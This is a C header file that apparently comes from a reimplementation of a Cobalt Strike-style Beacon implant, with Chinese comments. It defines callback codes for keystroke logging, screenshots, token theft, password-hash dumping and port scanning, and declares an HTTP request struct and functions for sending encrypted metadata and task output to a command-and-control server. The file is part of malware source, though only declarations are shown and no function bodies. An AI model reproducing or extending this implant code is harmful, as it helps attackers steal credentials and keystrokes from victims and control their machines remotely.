#pragma once
#include "Utils.h"

#define CALLBACK_OUTPUT  0
#define CALLBACK_KEYSTROKES  1
#define CALLBACK_FILE  2
#define CALLBACK_SCREENSHOT  3
#define CALLBACK_CLOSE  4
#define CALLBACK_READ  5
#define CALLBACK_CONNECT  6
#define CALLBACK_PING  7
#define CALLBACK_FILE_WRITE  8
#define CALLBACK_FILE_CLOSE  9
#define CALLBACK_PIPE_OPEN  10
#define CALLBACK_PIPE_CLOSE  11
#define CALLBACK_PIPE_READ  12
#define CALLBACK_POST_ERROR  13
#define CALLBACK_PIPE_PING  14
#define CALLBACK_TOKEN_STOLEN  15
#define CALLBACK_TOKEN_GETUID  16
#define CALLBACK_PROCESS_LIST  17
#define CALLBACK_POST_REPLAY_ERROR  18
#define CALLBACK_PWD  19
#define CALLBACK_JOBS  20
#define CALLBACK_HASHDUMP  21
#define CALLBACK_PENDING  22
#define CALLBACK_ACCEPT  23
#define CALLBACK_NETVIEW  24
#define CALLBACK_PORTSCAN  25
#define CALLBACK_DEAD  26
#define CALLBACK_SSH_STATUS  27
#define CALLBACK_CHUNK_ALLOCATE  28
#define CALLBACK_CHUNK_SEND  29
#define CALLBACK_OUTPUT_OEM  30
#define CALLBACK_ERROR  31
#define CALLBACK_OUTPUT_UTF8  32

typedef struct {
	char* httpHeaders; /* httpHeaders */
	char* field_1;   /* 暂时未知 */
	char* httpGetUrl; /*http get请求url*/
	char* HttpOptional;   /* HttpSendRequestA Optional选项 */
	DWORD HttpOptionalLength;     /* Optional选项大小 */
	DWORD encrypt_Metadata_size;	/*加密后的元数据大小*/
	char* encrypt_Metadata_Ptr;		/*指向加密元数据的指针*/
	char* Encoding_Encrypt_Metadata_Ptr;	/*根据c2配置编码后的加密元数据指针*/
	datap* pdatap;
} BeaconHttpRequest;

extern char* gBeaconOutputData;

void sned_beacon_data(char* data);

int call_send_Metadata(char* http_get_url, char* Server_Output_Buffer, int server_output_size);

void BeaconTaskOutput(char* data, int len, int type);

void BeaconTaskError1Output(int BeaconErrorsType, int err_code, char* data);

void BeaconErrorD(int BeaconErrorsType, DWORD error_code);

void BeaconErrorNA(int BeaconErrorsType);

void BeaconErrorDD(int BeaconErrorsType, int err_msg, u_long err_code_msg);
void BeaconErrorFormat(int BeaconErrorsType, char* Format, ...);